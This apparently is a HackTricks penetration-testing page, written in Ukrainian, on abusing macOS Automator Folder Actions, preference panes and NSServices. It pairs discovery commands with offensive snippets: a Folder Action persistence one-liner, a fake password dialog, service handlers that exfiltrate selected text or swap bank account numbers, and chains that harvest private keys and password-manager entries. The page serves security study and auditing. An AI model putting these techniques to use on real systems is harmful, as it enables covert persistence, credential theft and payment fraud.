# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** — це візуальний інструмент автоматизації macOS. Він виконує **workflows** (`.workflow` bundles), що складаються з **actions** (`.action` bundles). Automator також лежить в основі інтеграції **Folder Actions**, **Quick Actions** і **Shortcuts**. У сучасному macOS workflows також можна **імпортувати в Shortcuts**, тож той самий шкідливий логічний ланцюжок може з’являтися як Finder Quick Action, user service у `~/Library/Services/`, або shortcut на базі legacy Automator actions.

Automator actions — це **plugins**, які завантажуються в Automator runtime під час виконання workflow. Вони можуть:
- Виконувати довільні shell scripts
- Обробляти файли та дані
- Взаємодіяти з applications через AppleScript
- Ланцюжком поєднуватися для складної автоматизації

### Why This Matters

> [!WARNING]
> Automator workflows можна **social-engineered** змусити до виконання — вони виглядають як прості файли документів. `.workflow` bundle може містити вбудовані shell commands, які виконуються, коли workflow запускається. У поєднанні з Folder Actions вони забезпечують **automatic persistence**, що спрацьовує на події з файлами. Недавні Gatekeeper fixes також показали, що **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) потрібно вважати виконуваним вмістом, а не безпечними даними.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Атака: Social-Engineered Workflow

Пакет `.workflow` виглядає як звичайний файл документа для більшості користувачів:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Атака: Folder Action Persistence

Folder Actions автоматично виконують workflow, коли файли додаються до відстежуваної папки:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions зберігаються між перезавантаженнями та виконуються безшумно. Folder Action на `~/Downloads` означає, що **кожен завантажений файл запускає ваш payload** — включно з файлами з Safari, Chrome, AirDrop та вкладеннями електронної пошти. Також зауважте, що `System Events` може реєструвати Folder Actions, які вказують на scripts поза типовими розташуваннями `~/Library/Scripts/Folder Action Scripts`, що робить доцільним пошук по loose-path. Для пов’язаних наслідків TCC дивіться [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) — це plugins, які завантажуються з **System Settings** (раніше System Preferences). Вони надають панелі UI для налаштування системних або сторонніх функцій. На старіших системах вони завантажувалися безпосередньо через `System Preferences`; у новіших випусках сторонні panes зазвичай обробляються через **legacy loader XPC service**, запущений із System Settings.

### Why This Matters

- Preference panes виконуються в **trusted host process**, запущеному System Settings / System Preferences
- На сучасних системах цей host може бути **`legacyLoader` XPC service**, тож важливий кордон усе ще такий: **trusted Apple UI process -> third-party code loading**
- Сторонні preference panes успадковують **host process security context** і user trust, пов’язані з тим UI
- Користувачі встановлюють preference panes, **double-clicking** їх — це легко для social engineering
- Після встановлення вони **persist** і завантажуються щоразу, коли System Settings відкриває цю панель

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Атака: Hijacking контексту привілеїв

Шкідлива preference pane успадковує security context **pane host'а** (історично `System Preferences`, у новіших версіях часто допоміжний `legacyLoader`, запущений `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Атака: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Атака: UI Phishing

Панель налаштувань може імітувати легітимні системні UI-панелі, щоб **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** дозволяють застосункам надавати функціональність іншим apps через **Services menu** (right-click → Services). Коли користувач виділяє text або data і викликає service, вибрані data **надсилаються service provider** для обробки.

Services оголошуються в `Info.plist` застосунку під key `NSServices` і реєструються з pasteboard server (`pbs`). macOS також зберігає **service cache** і **restriction policy**, які визначають, які services є видимими та чи мають sandboxed callers отримувати додаткове попередження.

### Why This Matters

- Services отримують **cross-application data flow** — selected text з будь-якого application надсилається до service
- Malicious service перехоплює data з password managers, email clients, financial apps
- Services можуть **повертати modified data** до calling application (man-in-the-middle on selection operations)
- Service names можна оформити так, щоб вони виглядали legitimate ("Format Text", "Encrypt Selection", "Share")
- Optional `NSRestricted` flag є security-relevant: service, позначений як unrestricted, може бути викликаний sandboxed app без warning, який macOS показує для escape-prone services

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Атака: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Атака: Data Modification (Man-in-the-Middle)

Сервіс може **модифікувати повернуті дані**, водночас виглядаючи як такий, що надає легітимну функцію:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Обмежені сервіси та сучасне зловживання

Apple підтримує необов’язковий `NSRestricted` boolean для кожного визначення сервісу. Якщо його встановлено, macOS попереджає sandboxed викликачів, бо сервіс може допомогти їм **вийти за межі sandbox або privacy boundaries**. З offensive perspective це дає два корисні audit paths:

- Шукайте **сторонні сервіси, не позначені як restricted**, навіть якщо вони проксирують Apple Events, file access або інші privileged actions
- Шукайте **high-value вбудовані сервіси** зі strong entitlements (наприклад, сервіси, exposed by Script Editor або Finder-backed helpers) і перевіряйте, чи достатньо user interaction, щоб перетворити їх на data-access primitive

Хороший недавній приклад — **CVE-2022-48574**, де механізм Services можна було abuse, щоб дістатися до **TCC-protected user files без очікуваного confirmation flow**. Помилку виправлено, але technique і досі корисна для threat modeling: будь-який сервіс, що forwards file access або automation requests від імені викликачa, заслуговує на таку саму перевірку.

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple виправила Gatekeeper bypass у 2024 році, коли app-bundled Automator Quick Action міг виконуватися без normal assessment. Під час аудиту apps перевіряйте `Contents/PlugIns/*.workflow/Contents/document.wflow` так само, як перевіряли б helper scripts або login items. Див. [сторінку Gatekeeper](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: Apple також додала додатковий user-consent prompt після того, як у third-party shortcuts виявили використання **legacy Automator action** для надсилання Apple Events без очікуваного permission flow. Imported workflows і shortcut bundles слід перевіряти на `Run AppleScript`, `Run Shell Script` та подібні bridge actions. Див. [сторінку TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple випустила ще один Automator fix у 2025 році для доступу до protected user data. Навіть якщо Automator — це legacy surface, сприймайте будь-який workflow runner, Quick Action host або automation bridge як актуальну attack surface, а не мертвий code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Панель налаштувань → Підвищення TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Крадіжка Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Посилання

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
